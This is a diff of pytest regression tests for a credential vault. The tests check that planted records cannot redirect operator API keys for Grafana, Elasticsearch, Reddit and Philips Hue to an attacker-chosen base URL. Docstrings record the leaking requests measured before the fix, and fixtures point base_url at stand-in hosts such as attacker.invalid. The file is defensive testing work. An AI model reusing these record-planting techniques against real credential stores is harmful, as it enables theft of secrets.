@@ -309,9 +309,10 @@ def test_a_planted_record_that_holds_every_anchor_serves_its_own_secret(vault_se
     `secret_fields` is caller-chosen, so a record CAN satisfy the join by simply
     naming every anchor field with junk values. It then wins the destination, but
     it also outranks the operator's record on every one of those secret lookups,
-    so what rides to the attacker's address is the attacker's own junk. Slice C
-    replaces this with an egress-time record identity check; until then, this is
-    the property the join actually buys.
+    so what rides to the attacker's address is the attacker's own junk. That is
+    the property the join buys, and it is only true while "holds an anchor" is
+    judged by VALUE: see the empty-anchor test below, which is the version of
+    this that was NOT harmless.
     """
     repo = vault_setup
     _mint(
@@ -331,6 +332,88 @@ def test_a_planted_record_that_holds_every_anchor_serves_its_own_secret(vault_se
     assert _value("grafana", ("base_url", "url")) == "https://attacker.example"
     assert _value("grafana", ("api_key", "token", "value")) == "junk", (
         "the planted record steered the request but did not supply the key that rode to it"
+    )
+
+
+def test_an_empty_anchor_field_is_not_possession(vault_setup):
+    """Naming an anchor is not holding one, and the difference was a live bypass.
+
+    Two readings of the same record disagreed. The completeness rule read
+    ``record.secret_fields``, a list of NAMES, so an anchor spelled with an empty
+    value counted as held. The lookup loop that consumes its answer takes the
+    first TRUTHY value, so the same empty field was skipped and the NEXT record
+    answered. `POST /credentials` takes a bare ``dict[str, str]`` and any
+    authenticated user can reach it, so the planted record below cost nothing to
+    create.
+
+    Measured before the fix, on ``_elasticsearch_config``: base URL
+    ``https://attacker.invalid`` with ``Authorization: ApiKey
+    OPERATOR-ELASTIC-KEY``. The guard at the request site could not catch it
+    either, because the operator's key really did come from the vault, so its
+    provenance bit was true. Judging possession by value is what makes that bit
+    mean what its name says.
+    """
+    repo = vault_setup
+    _mint(
+        repo,
+        name="operator grafana",
+        provider="grafana",
+        secret_fields={"api_key": "OPERATOR-GRAFANA-KEY"},
+        owner_type="system",
+    )
+    _mint(
+        repo,
+        name="planted",
+        provider="grafana",
+        secret_fields={"base_url": "https://attacker.example", "api_key": ""},
+    )
+
+    _assert_refused("grafana", ("base_url", "url"))
+    assert _value("grafana", ("api_key", "token", "value")) == "OPERATOR-GRAFANA-KEY", (
+        "the operator's key must still resolve; only the planted ADDRESS is refused"
+    )
+
+    # And the same records under the OLD reading, so this test carries its own
+    # counterfactual instead of asserting the fix into existence. Reverting the
+    # rule means passing a name-based `holds`, which is exactly this lambda.
+    from nymeria.tools.native_credentials import _destination_record_id
+
+    records = [
+        record
+        for record in repo.list_credentials(owner_user_id="alice", include_system=True)
+        if record.provider == "grafana"
+    ]
+    records.sort(key=lambda record: (0 if record.owner_type == "user" else 1,))
+    anchors = credential_anchor_fields(get_provider_spec("grafana"))
+    by_name, _ = _destination_record_id(
+        records, anchors, lambda record: anchors & set(record.secret_fields or ())
+    )
+    by_value, _ = _destination_record_id(
+        records,
+        anchors,
+        lambda record: frozenset(
+            name
+            for name in anchors & set(record.secret_fields or ())
+            if repo.get_secret_field(
+                record.id,
+                name,
+                actor="alice",
+                target_type="native_tool",
+                target_id="grafana_query",
+            )
+        ),
+    )
+    planted = next(record.id for record in records if record.name == "planted")
+    operator = next(record.id for record in records if record.name == "operator grafana")
+    assert by_name == planted, (
+        "the name-based reading is what let the planted record serve the address; "
+        "if this stops being true the counterfactual has rotted and the test above "
+        "may be passing for a different reason"
+    )
+    assert by_value == operator, (
+        "under the value reading the right to serve the address moves to the record "
+        "that actually holds the key, which holds no base_url, so the lookup finds "
+        "nothing and raises rather than resolving the planted one"
     )
 
 
@@ -835,3 +918,175 @@ def test_records_that_agree_on_the_provider_name_are_unaffected(vault_setup):
 
     assert _value("grafana", ("base_url", "url")) == "https://g.prod"
     assert _value("grafana", ("api_key", "token", "value")) == "PROD-KEY"
+
+
+# --- sibling-helper joins: the address and the secret meet in a THIRD function
+
+def _reddit_config(monkeypatch, *, planted: dict, settings_env: dict):
+    """Drive the real ``_reddit_config`` with a planted record and env settings."""
+    from nymeria.config import settings as settings_module
+    from nymeria.tools import community_publishing_service_integrations as mod
+
+    for key, value in settings_env.items():
+        monkeypatch.setenv(key, value)
+    settings_module.get_settings.cache_clear()
+    return mod._reddit_config(
+        "reddit_get_subreddit", {"configurable": {"user_id": "alice"}}
+    )
+
+
+def test_reddit_bearer_will_not_ride_to_a_record_chosen_base(vault_setup, monkeypatch):
+    """A live leak found by adversarial review, on a provider this pass touched.
+
+    ``_reddit_access_token`` returns the direct token BEFORE reaching either of
+    its own guards, and it never sees the base URL that token rides to, because
+    ``_reddit_base`` resolves that in a sibling helper. Neither function looked
+    shaped alone. Reddit declares three independent anchor groups, so a record
+    holding ``base_url`` + ``refresh_token`` clears the completeness rule, misses
+    the ``token`` lookup entirely, and the deployment's setting answers it.
+
+    Measured before the fix:
+        GET https://attacker.invalid/r/python/about
+        Authorization: Bearer OPERATOR-REDDIT-BEARER
+    """
+    from nymeria.tools.native_credentials import CredentialDestinationRefused
+
+    _mint(
+        vault_setup,
+        name="planted",
+        provider="reddit",
+        secret_fields={
+            "base_url": "https://attacker.invalid",
+            "refresh_token": "junk",
+        },
+    )
+    with pytest.raises(CredentialDestinationRefused):
+        _reddit_config(
+            monkeypatch,
+            planted={},
+            settings_env={"REDDIT_ACCESS_TOKEN": "OPERATOR-REDDIT-BEARER"},
+        )
+
+
+def test_reddit_still_works_when_one_record_holds_both(vault_setup, monkeypatch):
+    """The control must cost no legitimate capability.
+
+    One record holding the address AND the token it authenticates is the
+    ordinary self-hosted shape, and it has to keep working even with a stale
+    deployment setting present.
+    """
+    _mint(
+        vault_setup,
+        name="mine",
+        provider="reddit",
+        secret_fields={
+            "base_url": "https://reddit.self.hosted",
+            "access_token": "MY-OWN-BEARER",
+        },
+    )
+    base, headers, oauth = _reddit_config(
+        monkeypatch,
+        planted={},
+        settings_env={"REDDIT_ACCESS_TOKEN": "OPERATOR-REDDIT-BEARER"},
+    )
+    assert base.startswith("https://reddit.self.hosted")
+    assert headers["Authorization"] == "Bearer MY-OWN-BEARER"
+    assert oauth is True
+
+
+def test_reddit_settings_only_deployment_is_untouched(vault_setup, monkeypatch):
+    """No vault record at all: the operator's own configuration must still work."""
+    base, headers, oauth = _reddit_config(
+        monkeypatch,
+        planted={},
+        settings_env={"REDDIT_ACCESS_TOKEN": "OPERATOR-REDDIT-BEARER"},
+    )
+    assert headers["Authorization"] == "Bearer OPERATOR-REDDIT-BEARER"
+    assert oauth is True
+
+
+def _hue_config(monkeypatch, *, settings_env: dict):
+    from nymeria.config import settings as settings_module
+    from nymeria.tools import personal_device_service_integrations as mod
+
+    for key, value in settings_env.items():
+        monkeypatch.setenv(key, value)
+    settings_module.get_settings.cache_clear()
+    return mod._philips_hue_config(
+        "philips_hue_list_lights", {"configurable": {"user_id": "alice"}}
+    )
+
+
+def test_hue_bridge_key_will_not_ride_to_a_record_chosen_base(vault_setup, monkeypatch):
+    """A register MISCLASSIFICATION, not a missing guard, found by review.
+
+    Hue calls its bridge application key ``username``. For a local bridge that
+    one value IS the whole credential, and it goes in the URL PATH. The global
+    ``_NON_PROOF_NAMES`` list read the name and classified it as public
+    metadata, so it was neither an anchor nor a destination, the provider looked
+    unshaped, and nothing required a join.
+
+    Measured before the fix:
+        GET https://attacker.invalid/api/OPERATOR-HUE-BRIDGE-KEY/lights
+
+    The fix is the per-spec ``proves_possession=True`` override plus the join in
+    ``_philips_hue_config``, and the two do DIFFERENT jobs. Measured by reverting
+    each alone: only the join closes the leak (the override alone still leaks,
+    because with a single planted record the completeness rule is satisfied
+    vacuously and the key still falls through to the deployment setting), and
+    the override alone fails only its own test. The override is not what makes
+    this safe; it makes the register TRUE, which is what lets a ratchet see the
+    site at all. Do not read it as load-bearing for this test.
+    """
+    from nymeria.tools.native_credentials import CredentialDestinationRefused
+
+    _mint(
+        vault_setup,
+        name="planted",
+        provider="philips_hue",
+        secret_fields={
+            "base_url": "https://attacker.invalid",
+            "access_token": "junk",
+        },
+    )
+    with pytest.raises(CredentialDestinationRefused):
+        _hue_config(
+            monkeypatch,
+            settings_env={"PHILIPS_HUE_USERNAME": "OPERATOR-HUE-BRIDGE-KEY"},
+        )
+
+
+def test_hue_username_is_proof_of_possession(vault_setup):
+    """Pins the override itself, independently of the call site."""
+    from nymeria.tools.credential_registry import (
+        credential_anchor_fields,
+        get_provider_spec,
+    )
+
+    anchors = credential_anchor_fields(get_provider_spec("philips_hue"))
+    assert {"username", "bridge_username"} <= anchors, (
+        "Hue's bridge application key must count as proof of possession; the "
+        "global non-proof name list gets this one provider wrong"
+    )
+    # The destination veto still outranks the override everywhere.
+    assert "base_url" not in anchors
+
+
+def test_hue_still_works_when_one_record_holds_both(vault_setup, monkeypatch):
+    _mint(
+        vault_setup,
+        name="mine",
+        provider="philips_hue",
+        secret_fields={
+            "base_url": "https://hue.self.hosted",
+            "access_token": "MY-TOKEN",
+            "username": "MY-BRIDGE-KEY",
+        },
+    )
+    result = _hue_config(
+        monkeypatch, settings_env={"PHILIPS_HUE_USERNAME": "OPERATOR-HUE-BRIDGE-KEY"}
+    )
+    assert not isinstance(result, str), result
+    base, username, _headers = result
+    assert base.startswith("https://hue.self.hosted")
+    assert username == "MY-BRIDGE-KEY"
